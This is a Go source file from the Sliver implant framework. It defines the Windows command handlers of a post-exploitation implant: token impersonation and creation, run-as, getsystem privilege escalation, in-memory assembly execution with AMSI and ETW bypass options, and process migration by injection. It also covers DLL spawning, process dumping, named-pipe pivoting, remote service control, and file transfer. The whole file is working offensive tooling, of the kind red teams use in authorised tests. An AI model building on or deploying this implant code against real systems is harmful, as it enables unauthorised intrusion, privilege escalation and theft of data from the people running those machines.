package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/priv"
	"github.com/bishopfox/sliver/sliver/service"
	"github.com/bishopfox/sliver/sliver/taskrunner"
	"github.com/bishopfox/sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
	"golang.org/x/sys/windows"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		// Windows Only
		sliverpb.MsgTaskReq:            taskHandler,
		sliverpb.MsgProcessDumpReq:     dumpHandler,
		sliverpb.MsgImpersonateReq:     impersonateHandler,
		sliverpb.MsgRevToSelfReq:       revToSelfHandler,
		sliverpb.MsgRunAsReq:           runAsHandler,
		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
		sliverpb.MsgStartServiceReq:    startService,
		sliverpb.MsgStopServiceReq:     stopService,
		sliverpb.MsgRemoveServiceReq:   removeService,
		sliverpb.MsgEnvReq:             getEnvHandler,

		// Generic
		sliverpb.MsgPsReq:        psHandler,
		sliverpb.MsgTerminateReq: terminateHandler,
		sliverpb.MsgPing:         pingHandler,
		sliverpb.MsgLsReq:        dirListHandler,
		sliverpb.MsgDownloadReq:  downloadHandler,
		sliverpb.MsgUploadReq:    uploadHandler,
		sliverpb.MsgCdReq:        cdHandler,
		sliverpb.MsgPwdReq:       pwdHandler,
		sliverpb.MsgRmReq:        rmHandler,
		sliverpb.MsgMkdirReq:     mkdirHandler,
		sliverpb.MsgIfconfigReq:  ifconfigHandler,
		sliverpb.MsgExecuteReq:   executeHandler,

		sliverpb.MsgScreenshotReq: screenshotHandler,

		sliverpb.MsgSideloadReq:  sideloadHandler,
		sliverpb.MsgNetstatReq:   netstatHandler,
		sliverpb.MsgMakeTokenReq: makeTokenHandler,
	}

	windowsPivotHandlers = map[uint32]PivotHandler{
		sliverpb.MsgNamedPipesReq: namedPipeListenerHandler,
	}
)

// GetSystemHandlers - Returns a map of the windows system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// GetSystemPivotHandlers - Returns a map of the windows system handlers
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return windowsPivotHandlers
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &sliverpb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &sliverpb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.Args)
	runAs := &sliverpb.RunAs{
		Output: out,
	}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &sliverpb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &sliverpb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &sliverpb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	//{{if .Debug}}
	log.Println("executeAssemblyHandler called")
	//{{end}}
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass, execReq.EtwBypass, execReq.Offset)
	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &sliverpb.InvokeMigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &sliverpb.Migrate{Success: true}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
		// {{if .Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &sliverpb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs())
	spawnResp := &sliverpb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	namedPipeReq := &sliverpb.NamedPipesReq{}
	err := proto.Unmarshal(envelope.Data, namedPipeReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		namedPipeResp := &sliverpb.NamedPipes{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	err = pivots.StartNamedPipeListener(namedPipeReq.GetPipeName())
	if err != nil {
		// {{if .Debug}}
		log.Printf("error with listener: %s", err.Error())
		// {{end}}
		namedPipeResp := &sliverpb.NamedPipes{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(namedPipeResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	namedPipeResp := &sliverpb.NamedPipes{
		Success: true,
	}
	data, _ := proto.Marshal(namedPipeResp)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func makeTokenHandler(data []byte, resp RPCResponse) {
	makeTokenReq := &sliverpb.MakeTokenReq{}
	err := proto.Unmarshal(data, makeTokenReq)
	if err != nil {
		return
	}
	makeTokenResp := &sliverpb.MakeToken{}
	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
	if err != nil {
		makeTokenResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(makeTokenResp)
	resp(data, err)
}

func startService(data []byte, resp RPCResponse) {
	startService := &sliverpb.StartServiceReq{}
	err := proto.Unmarshal(data, startService)
	if err != nil {
		return
	}
	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
	startServiceResp := &sliverpb.ServiceInfo{}
	if err != nil {
		startServiceResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(startServiceResp)
	resp(data, err)
}

func stopService(data []byte, resp RPCResponse) {
	stopServiceReq := &sliverpb.StopServiceReq{}
	err := proto.Unmarshal(data, stopServiceReq)
	if err != nil {
		return
	}
	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func removeService(data []byte, resp RPCResponse) {
	removeServiceReq := &sliverpb.RemoveServiceReq{}
	err := proto.Unmarshal(data, removeServiceReq)
	if err != nil {
		return
	}
	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sliverpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}
